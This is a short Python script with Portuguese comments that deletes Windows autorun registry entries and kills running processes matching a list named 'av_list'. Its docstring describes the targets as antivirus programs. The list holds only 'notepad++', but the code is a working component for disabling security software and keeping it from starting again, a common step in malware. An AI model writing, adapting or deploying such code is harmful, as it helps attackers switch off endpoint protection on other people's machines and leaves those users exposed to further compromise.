import winreg, wmi, os, signal, logging

# Configuração de logging para registrar o comportamento do código
logging.basicConfig(filename='autorun_removal.log', level=logging.INFO)

av_list = ["notepad++"]  # Lista de programas a serem removidos

def remove_autorun_keys():
    """Remove chaves de autorun do Registro do Windows"""
    reghives = [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]
    regpaths = ["SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"]
    
    for reghive in reghives:
        for regpath in regpaths: 
            try:
                reg = winreg.ConnectRegistry(None, reghive)
                key = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_READ)
                index = 0
                while True:
                    try:
                        val = winreg.EnumValue(key, index)
                        for name in av_list:
                            if name in val[1]:
                                logging.info(f"Deleting {val[0]} Autorun Key")
                                key2 = winreg.OpenKey(reg, regpath, 0, access=winreg.KEY_SET_VALUE)
                                winreg.DeleteValue(key2, val[0])
                    except OSError:
                        break  # No more values to enumerate
                    index += 1
            except Exception as e:
                logging.error(f"Error removing autorun keys: {e}")

def kill_processes():
    """Mata processos associados à lista de antivírus especificada"""
    f = wmi.WMI()
    for process in f.Win32_Process():
        for name in av_list:
            if name in process.Name:
                try:
                    os.kill(int(process.processId), signal.SIGTERM)
                    logging.info(f"Terminated process {process.Name} (PID {process.processId})")
                except Exception as e:
                    logging.error(f"Error terminating process {process.Name}: {e}")

# Remover chaves do registro
remove_autorun_keys()

# Matar processos
kill_processes()
